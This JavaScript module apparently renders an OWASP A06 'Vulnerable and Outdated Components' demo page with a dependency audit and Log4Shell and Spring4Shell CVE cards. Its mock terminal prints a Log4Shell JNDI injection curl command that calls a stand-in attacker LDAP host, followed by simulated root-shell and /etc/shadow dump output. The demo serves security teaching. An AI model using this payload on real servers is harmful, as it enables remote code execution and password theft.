/**
 * A06:2021 – Vulnerable and Outdated Components
 * Shows the app running a known-vulnerable version of a library (Log4Shell)
 * and demonstrates the JNDI injection exploit being triggered.
 */
const demonstrateVulnerableComponents = () => {
    return async (page) => {
        const html = `<!DOCTYPE html>
<html>
<head>
  <title>A06 - Vulnerable Components</title>
  <style>
    * { box-sizing:border-box; margin:0; padding:0; }
    body { font-family:'Segoe UI',sans-serif; background:#0f0f1a; color:#e0e0e0; padding:2rem; }
    h1 { color:#f87171; font-size:1.2rem; margin-bottom:0.5rem; }
    .alert { background:rgba(239,68,68,0.1); border:1px solid rgba(239,68,68,0.3); border-radius:6px; padding:0.75rem 1rem; margin-bottom:1.5rem; color:#fca5a5; font-size:0.83rem; }
    .grid { display:grid; grid-template-columns:1fr 1fr; gap:1.25rem; }
    .panel { background:#1e1e2e; border:1px solid #2d2d3a; border-radius:8px; padding:1.25rem; }
    .panel-title { font-size:0.72rem; font-weight:700; text-transform:uppercase; letter-spacing:0.08em; margin-bottom:0.75rem; }
    .panel-title.red { color:#f87171; }
    .panel-title.yellow { color:#fbbf24; }
    .dep-row { display:flex; align-items:center; justify-content:space-between; padding:0.4rem 0; border-bottom:1px solid #1a1a2e; font-size:0.8rem; }
    .dep-name { font-family:monospace; color:#94a3b8; }
    .dep-ver { font-family:monospace; }
    .dep-ver.vuln { color:#f87171; background:rgba(248,113,113,0.1); padding:0.1rem 0.4rem; border-radius:4px; }
    .dep-ver.ok { color:#4ade80; }
    .cve-card { background:#2a1010; border:1px solid #7f1d1d; border-radius:6px; padding:0.75rem; margin-bottom:0.75rem; }
    .cve-id { color:#f87171; font-family:monospace; font-weight:700; font-size:0.85rem; }
    .cve-score { float:right; background:#ef4444; color:#fff; padding:0.15rem 0.4rem; border-radius:4px; font-size:0.7rem; font-weight:700; }
    .cve-desc { font-size:0.78rem; color:#94a3b8; margin-top:0.3rem; }
    .terminal { background:#0d0d0d; border-radius:6px; padding:1rem; font-family:monospace; font-size:0.75rem; line-height:1.8; margin-top:1.25rem; grid-column:1/-1; }
    .prompt { color:#4ade80; }
    .exploit { color:#f87171; }
    .success { color:#4ade80; }
    .info { color:#7dd3fc; }
  </style>
</head>
<body>
  <h1>📦 Vulnerable Components Detected</h1>
  <div class="alert">⚠️ A06:2021 — App is running Log4j 2.14.1 (CVE-2021-44228, CVSS 10.0). A single HTTP header triggers remote code execution on the server.</div>

  <div class="grid">
    <div class="panel">
      <div class="panel-title yellow">📋 Dependency Audit</div>
      <div class="dep-row"><span class="dep-name">log4j-core</span><span class="dep-ver vuln">2.14.1 ⚠️</span></div>
      <div class="dep-row"><span class="dep-name">spring-core</span><span class="dep-ver vuln">5.2.8 ⚠️</span></div>
      <div class="dep-row"><span class="dep-name">jackson-databind</span><span class="dep-ver vuln">2.9.10 ⚠️</span></div>
      <div class="dep-row"><span class="dep-name">struts2-core</span><span class="dep-ver vuln">2.5.25 ⚠️</span></div>
      <div class="dep-row"><span class="dep-name">openssl</span><span class="dep-ver ok">3.0.8 ✓</span></div>
      <div class="dep-row"><span class="dep-name">react</span><span class="dep-ver ok">18.2.0 ✓</span></div>
    </div>

    <div class="panel">
      <div class="panel-title red">🔴 Critical CVEs</div>
      <div class="cve-card">
        <span class="cve-score">CVSS 10.0</span>
        <div class="cve-id">CVE-2021-44228 (Log4Shell)</div>
        <div class="cve-desc">JNDI injection via log messages allows unauthenticated RCE. Affects log4j-core 2.0–2.14.1.</div>
      </div>
      <div class="cve-card">
        <span class="cve-score">CVSS 9.8</span>
        <div class="cve-id">CVE-2022-22965 (Spring4Shell)</div>
        <div class="cve-desc">Data binding RCE vulnerability in Spring MVC on JDK 9+.</div>
      </div>
    </div>

    <div class="terminal">
      <span class="info"># Exploit: Log4Shell RCE via User-Agent header</span><br>
      <span class="prompt">$ </span>curl -H 'User-Agent: $\{jndi:ldap://attacker.com:1389/exploit\}' https://targetapp.com/api/login<br><br>
      <span class="info"># Attacker's LDAP server receives the callback from TARGET SERVER</span><br>
      <span class="exploit">[LDAP] Connection from 203.0.113.42 (targetapp.com) — RCE payload delivered!</span><br>
      <span class="success">[Shell] whoami → root</span><br>
      <span class="success">[Shell] cat /etc/shadow → Password hashes dumped</span><br>
      <span class="success">[Shell] Reverse shell established. Full server control achieved.</span>
    </div>
  </div>
</body>
</html>`;
        await page.goto(`data:text/html,${encodeURIComponent(html)}`);
        await page.waitForTimeout(4500);
    };
};

module.exports = demonstrateVulnerableComponents;
